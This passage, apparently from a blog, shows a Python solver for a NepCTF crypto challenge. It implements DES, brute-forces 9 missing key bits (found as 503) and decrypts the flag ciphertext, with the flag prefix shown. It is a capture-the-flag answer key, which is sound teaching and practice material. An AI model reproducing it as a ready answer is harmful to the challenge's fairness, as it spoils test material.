[<span class=\"number\">13</span>, <span class=\"number\">6</span>, <span class=\"number\">4</span>, <span class=\"number\">9</span>, <span class=\"number\">8</span>, <span class=\"number\">15</span>, <span class=\"number\">3</span>, <span class=\"number\">0</span>, <span class=\"number\">11</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">12</span>, <span class=\"number\">5</span>, <span class=\"number\">10</span>, <span class=\"number\">14</span>, <span class=\"number\">7</span>],</span><br><span class=\"line\">        [<span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">13</span>, <span class=\"number\">0</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">8</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">15</span>, <span class=\"number\">14</span>, <span class=\"number\">3</span>, <span class=\"number\">11</span>, <span class=\"number\">5</span>, <span class=\"number\">2</span>, <span class=\"number\">12</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">7</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">3</span>, <span class=\"number\">0</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>, <span class=\"number\">15</span>],</span><br><span class=\"line\">        [<span class=\"number\">13</span>, <span class=\"number\">8</span>, <span class=\"number\">11</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">12</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">14</span>, <span class=\"number\">9</span>],</span><br><span class=\"line\">        [<span class=\"number\">10</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">0</span>, <span class=\"number\">12</span>, <span class=\"number\">11</span>, <span class=\"number\">7</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">14</span>, <span class=\"number\">5</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">4</span>],</span><br><span class=\"line\">        [<span class=\"number\">3</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">6</span>, <span class=\"number\">10</span>, <span class=\"number\">1</span>, <span class=\"number\">13</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">14</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">2</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">15</span>, <span class=\"number\">13</span>, <span class=\"number\">0</span>, <span class=\"number\">14</span>, <span class=\"number\">9</span>],</span><br><span class=\"line\">        [<span class=\"number\">14</span>, <span class=\"number\">11</span>, <span class=\"number\">2</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>, <span class=\"number\">7</span>, <span class=\"number\">13</span>, <span class=\"number\">1</span>, <span class=\"number\">5</span>, <span class=\"number\">0</span>, <span class=\"number\">15</span>, <span class=\"number\">10</span>, <span class=\"number\">3</span>, <span class=\"number\">9</span>, <span class=\"number\">8</span>, <span class=\"number\">6</span>],</span><br><span class=\"line\">        [<span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">11</span>, <span class=\"number\">10</span>, <span class=\"number\">13</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">15</span>, <span class=\"number\">9</span>, <span class=\"number\">12</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">3</span>, <span class=\"number\">0</span>, <span class=\"number\">14</span>],</span><br><span class=\"line\">        [<span class=\"number\">11</span>, <span class=\"number\">8</span>, <span class=\"number\">12</span>, <span class=\"number\">7</span>, <span class=\"number\">1</span>, <span class=\"number\">14</span>, <span class=\"number\">2</span>, <span class=\"number\">13</span>, <span class=\"number\">6</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">12</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">15</span>, <span class=\"number\">9</span>, <span class=\"number\">2</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">0</span>, <span class=\"number\">13</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">14</span>, <span class=\"number\">7</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>],</span><br><span class=\"line\">        [<span class=\"number\">10</span>, <span class=\"number\">15</span>, <span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">7</span>, <span class=\"number\">12</span>, <span class=\"number\">9</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">1</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">0</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>, <span class=\"number\">8</span>],</span><br><span class=\"line\">        [<span class=\"number\">9</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">5</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">12</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">0</span>, <span class=\"number\">4</span>, <span class=\"number\">10</span>, <span class=\"number\">1</span>, <span class=\"number\">13</span>, <span class=\"number\">11</span>, <span class=\"number\">6</span>],</span><br><span class=\"line\">        [<span class=\"number\">4</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>, <span class=\"number\">12</span>, <span class=\"number\">9</span>, <span class=\"number\">5</span>, <span class=\"number\">15</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">14</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">6</span>, <span class=\"number\">0</span>, <span class=\"number\">8</span>, <span class=\"number\">13</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">4</span>, <span class=\"number\">11</span>, <span class=\"number\">2</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">8</span>, <span class=\"number\">13</span>, <span class=\"number\">3</span>, <span class=\"number\">12</span>, <span class=\"number\">9</span>, <span class=\"number\">7</span>, <span class=\"number\">5</span>, <span class=\"number\">10</span>, <span class=\"number\">6</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">        [<span class=\"number\">13</span>, <span class=\"number\">0</span>, <span class=\"number\">11</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">14</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">12</span>, <span class=\"number\">2</span>, <span class=\"number\">15</span>, <span class=\"number\">8</span>, <span class=\"number\">6</span>],</span><br><span class=\"line\">        [<span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">12</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">14</span>, <span class=\"number\">10</span>, <span class=\"number\">15</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">0</span>, <span class=\"number\">5</span>, <span class=\"number\">9</span>, <span class=\"number\">2</span>],</span><br><span class=\"line\">        [<span class=\"number\">6</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">8</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">10</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">5</span>, <span class=\"number\">0</span>, <span class=\"number\">15</span>, <span class=\"number\">14</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">12</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">13</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">15</span>, <span class=\"number\">11</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">9</span>, <span class=\"number\">3</span>, <span class=\"number\">14</span>, <span class=\"number\">5</span>, <span class=\"number\">0</span>, <span class=\"number\">12</span>, <span class=\"number\">7</span>],</span><br><span class=\"line\">        [<span class=\"number\">1</span>, <span class=\"number\">15</span>, <span class=\"number\">13</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">12</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">11</span>, <span class=\"number\">0</span>, <span class=\"number\">14</span>, <span class=\"number\">9</span>, <span class=\"number\">2</span>],</span><br><span class=\"line\">        [<span class=\"number\">7</span>, <span class=\"number\">11</span>, <span class=\"number\">4</span>, <span class=\"number\">1</span>, <span class=\"number\">9</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>, <span class=\"number\">6</span>, <span class=\"number\">10</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">8</span>],</span><br><span class=\"line\">        [<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">14</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">10</span>, <span class=\"number\">8</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">12</span>, <span class=\"number\">9</span>, <span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">11</span>]</span><br><span class=\"line\">    ]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">S_box</span>(<span class=\"params\">data: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    output = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">48</span>, <span class=\"number\">6</span>):</span><br><span class=\"line\">        row = data[i] * <span class=\"number\">2</span> + data[i + <span class=\"number\">5</span>]</span><br><span class=\"line\">        col = reduce(add, [data[i + j] * (<span class=\"number\">2</span> ** (<span class=\"number\">4</span> - j)) <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">5</span>)])</span><br><span class=\"line\">        output += [<span class=\"built_in\">int</span>(x) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">format</span>(__s_box[i // <span class=\"number\">6</span>][row][col], <span class=\"string\">&#x27;04b&#x27;</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> output</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">plain: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>], sub_keys: <span class=\"type\">List</span>[<span class=\"type\">List</span>[<span class=\"built_in\">int</span>]]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    plain = IP(plain)</span><br><span class=\"line\">    L, R = plain[:<span class=\"number\">32</span>], plain[<span class=\"number\">32</span>:]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">        prev_L = L</span><br><span class=\"line\">        L = R</span><br><span class=\"line\">        expanded_R = EP(R)</span><br><span class=\"line\">        xor_result = [a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(expanded_R, sub_keys[i])]</span><br><span class=\"line\">        substituted = S_box(xor_result)</span><br><span class=\"line\">        permuted = P(substituted)</span><br><span class=\"line\"></span><br><span class=\"line\">        R = [a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(permuted, prev_L)]</span><br><span class=\"line\"></span><br><span class=\"line\">    cipher = R + L</span><br><span class=\"line\">    cipher = [cipher[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> [<span class=\"number\">39</span>, <span class=\"number\">7</span>, <span class=\"number\">47</span>, <span class=\"number\">15</span>, <span class=\"number\">55</span>, <span class=\"number\">23</span>, <span class=\"number\">63</span>, <span class=\"number\">31</span>,</span><br><span class=\"line\">                                  <span class=\"number\">38</span>, <span class=\"number\">6</span>, <span class=\"number\">46</span>, <span class=\"number\">14</span>, <span class=\"number\">54</span>, <span class=\"number\">22</span>, <span class=\"number\">62</span>, <span class=\"number\">30</span>,</span><br><span class=\"line\">                                  <span class=\"number\">37</span>, <span class=\"number\">5</span>, <span class=\"number\">45</span>, <span class=\"number\">13</span>, <span class=\"number\">53</span>, <span class=\"number\">21</span>, <span class=\"number\">61</span>, <span class=\"number\">29</span>,</span><br><span class=\"line\">                                  <span class=\"number\">36</span>, <span class=\"number\">4</span>, <span class=\"number\">44</span>, <span class=\"number\">12</span>, <span class=\"number\">52</span>, <span class=\"number\">20</span>, <span class=\"number\">60</span>, <span class=\"number\">28</span>,</span><br><span class=\"line\">                                  <span class=\"number\">35</span>, <span class=\"number\">3</span>, <span class=\"number\">43</span>, <span class=\"number\">11</span>, <span class=\"number\">51</span>, <span class=\"number\">19</span>, <span class=\"number\">59</span>, <span class=\"number\">27</span>,</span><br><span class=\"line\">                                  <span class=\"number\">34</span>, <span class=\"number\">2</span>, <span class=\"number\">42</span>, <span class=\"number\">10</span>, <span class=\"number\">50</span>, <span class=\"number\">18</span>, <span class=\"number\">58</span>, <span class=\"number\">26</span>,</span><br><span class=\"line\">                                  <span class=\"number\">33</span>, <span class=\"number\">1</span>, <span class=\"number\">41</span>, <span class=\"number\">9</span>, <span class=\"number\">49</span>, <span class=\"number\">17</span>, <span class=\"number\">57</span>, <span class=\"number\">25</span>,</span><br><span class=\"line\">                                  <span class=\"number\">32</span>, <span class=\"number\">0</span>, <span class=\"number\">40</span>, <span class=\"number\">8</span>, <span class=\"number\">48</span>, <span class=\"number\">16</span>, <span class=\"number\">56</span>, <span class=\"number\">24</span>]]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> cipher</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bitxor</span>(<span class=\"params\">plain1: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>], plain2: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [<span class=\"built_in\">int</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span></span><br><span class=\"line\">            <span class=\"built_in\">bin</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> plain1), <span class=\"number\">2</span>) ^ <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> plain2), <span class=\"number\">2</span>))[<span class=\"number\">2</span>:].zfill(<span class=\"number\">64</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">x, y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + y</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">plain: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>], sub_keys: <span class=\"type\">List</span>[<span class=\"type\">List</span>[<span class=\"built_in\">int</span>]]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"comment\"># plain = IP(plain)</span></span><br><span class=\"line\">    L, R = plain[:<span class=\"number\">32</span>], plain[<span class=\"number\">32</span>:]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">        prev_L = L</span><br><span class=\"line\">        L = R</span><br><span class=\"line\">        expanded_R = EP(R)</span><br><span class=\"line\">        xor_result = [a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(expanded_R, sub_keys[i])]</span><br><span class=\"line\">        substituted = S_box(xor_result)</span><br><span class=\"line\">        permuted = P(substituted)</span><br><span class=\"line\"></span><br><span class=\"line\">        R = [a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(permuted, prev_L)]</span><br><span class=\"line\"></span><br><span class=\"line\">    cipher = R + L</span><br><span class=\"line\">    <span class=\"comment\"># cipher = [cipher[x] for x in [39, 7, 47, 15, 55, 23, 63, 31,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               38, 6, 46, 14, 54, 22, 62, 30,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               37, 5, 45, 13, 53, 21, 61, 29,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               36, 4, 44, 12, 52, 20, 60, 28,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               35, 3, 43, 11, 51, 19, 59, 27,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               34, 2, 42, 10, 50, 18, 58, 26,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               33, 1, 41, 9, 49, 17, 57, 25,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               32, 0, 40, 8, 48, 16, 56, 24]]</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> cipher</span><br><span class=\"line\"></span><br><span class=\"line\">P0 = [<span class=\"number\">39</span>, <span class=\"number\">7</span>, <span class=\"number\">47</span>, <span class=\"number\">15</span>, <span class=\"number\">55</span>, <span class=\"number\">23</span>, <span class=\"number\">63</span>, <span class=\"number\">31</span>,</span><br><span class=\"line\">                                  <span class=\"number\">38</span>, <span class=\"number\">6</span>, <span class=\"number\">46</span>, <span class=\"number\">14</span>, <span class=\"number\">54</span>, <span class=\"number\">22</span>, <span class=\"number\">62</span>, <span class=\"number\">30</span>,</span><br><span class=\"line\">                                  <span class=\"number\">37</span>, <span class=\"number\">5</span>, <span class=\"number\">45</span>, <span class=\"number\">13</span>, <span class=\"number\">53</span>, <span class=\"number\">21</span>, <span class=\"number\">61</span>, <span class=\"number\">29</span>,</span><br><span class=\"line\">                                  <span class=\"number\">36</span>, <span class=\"number\">4</span>, <span class=\"number\">44</span>, <span class=\"number\">12</span>, <span class=\"number\">52</span>, <span class=\"number\">20</span>, <span class=\"number\">60</span>, <span class=\"number\">28</span>,</span><br><span class=\"line\">                                  <span class=\"number\">35</span>, <span class=\"number\">3</span>, <span class=\"number\">43</span>, <span class=\"number\">11</span>, <span class=\"number\">51</span>, <span class=\"number\">19</span>, <span class=\"number\">59</span>, <span class=\"number\">27</span>,</span><br><span class=\"line\">                                  <span class=\"number\">34</span>, <span class=\"number\">2</span>, <span class=\"number\">42</span>, <span class=\"number\">10</span>, <span class=\"number\">50</span>, <span class=\"number\">18</span>, <span class=\"number\">58</span>, <span class=\"number\">26</span>,</span><br><span class=\"line\">                                  <span class=\"number\">33</span>, <span class=\"number\">1</span>, <span class=\"number\">41</span>, <span class=\"number\">9</span>, <span class=\"number\">49</span>, <span class=\"number\">17</span>, <span class=\"number\">57</span>, <span class=\"number\">25</span>,</span><br><span class=\"line\">                                  <span class=\"number\">32</span>, <span class=\"number\">0</span>, <span class=\"number\">40</span>, <span class=\"number\">8</span>, <span class=\"number\">48</span>, <span class=\"number\">16</span>, <span class=\"number\">56</span>, <span class=\"number\">24</span>]</span><br><span class=\"line\">P0_inv = [<span class=\"number\">0</span>] * <span class=\"built_in\">len</span>(P0)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, b <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(P0):</span><br><span class=\"line\">    P0_inv[b] = i</span><br><span class=\"line\"></span><br><span class=\"line\">_IP_inv = [<span class=\"number\">0</span>] * <span class=\"built_in\">len</span>(_IP)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, b <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(_IP):</span><br><span class=\"line\">    _IP_inv[b] = i</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">P_set</span>(<span class=\"params\">c, box</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [c[_] <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> box]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bin2str</span>(<span class=\"params\">x: []</span>):</span><br><span class=\"line\">    res = <span class=\"built_in\">bytearray</span>()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(x), <span class=\"number\">8</span>):</span><br><span class=\"line\">        res.append(<span class=\"built_in\">int</span>(<span class=\"string\">&quot;&quot;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, x[i:i+<span class=\"number\">8</span>])), <span class=\"number\">2</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 爆破过程</span></span><br><span class=\"line\"><span class=\"comment\"># check = []</span></span><br><span class=\"line\"><span class=\"comment\"># for test in range(2 ** 9):</span></span><br><span class=\"line\"><span class=\"comment\"># # for test in range(1):</span></span><br><span class=\"line\"><span class=\"comment\">#     LL= [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span></span><br><span class=\"line\"><span class=\"comment\">#     RR= [0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0]</span></span><br><span class=\"line\"><span class=\"comment\">#     LL += list(map(int, bin(test)[2:].ljust(9, &quot;0&quot;)))</span></span><br><span class=\"line\"><span class=\"comment\">#     sub_keys = []</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     t=[0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0]</span></span><br><span class=\"line\"><span class=\"comment\">#     for i in range(16):</span></span><br><span class=\"line\"><span class=\"comment\">#         combined = LL + RR</span></span><br><span class=\"line\"><span class=\"comment\">#         sub_key = PC_2(combined)</span></span><br><span class=\"line\"><span class=\"comment\">#         sub_keys.append(sub_key)</span></span><br><span class=\"line\"><span class=\"comment\">#         for j in range(ROTATIONS[::-1][i]):</span></span><br><span class=\"line\"><span class=\"comment\">#             LL.insert(0, LL.pop(-1))</span></span><br><span class=\"line\"><span class=\"comment\">#             RR.insert(0, RR.pop(-1))</span></span><br><span class=\"line\"><span class=\"comment\">#     # print(LL)</span></span><br><span class=\"line\"><span class=\"comment\">#     # print(RR)</span></span><br><span class=\"line\"><span class=\"comment\">#     # sub_keys = sub_keys[::-1]</span></span><br><span class=\"line\"><span class=\"comment\">#     # print(sub_keys)</span></span><br><span class=\"line\"><span class=\"comment\">#     ct = decrypt(P_set(t[:64], P0_inv), sub_keys)</span></span><br><span class=\"line\"><span class=\"comment\">#     print(test, bin2str(P_set(ct, _IP_inv)))</span></span><br><span class=\"line\"><span class=\"comment\">#     x = bin2str(P_set(ct, _IP_inv))</span></span><br><span class=\"line\"><span class=\"comment\">#     check.append((len(repr(x)), x, test))</span></span><br><span class=\"line\"><span class=\"comment\"># check.sort()</span></span><br><span class=\"line\"><span class=\"comment\"># print(check)</span></span><br><span class=\"line\"><span class=\"comment\"># (22, bytearray(b&#x27;NepCTF&#123;N&#x27;), 503)</span></span><br><span class=\"line\"></span><br><span class=\"line\">LL= [<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>]</span><br><span class=\"line\">RR= [<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>]</span><br><span class=\"line\">LL += <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">int</span>, <span class=\"built_in\">bin</span>(<span class=\"number\">503</span>)[<span class=\"number\">2</span>:].ljust(<span class=\"number\">9</span>, <span class=\"string\">&quot;0&quot;</span>)))</span><br><span class=\"line\">sub_keys = []</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">t=[<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span 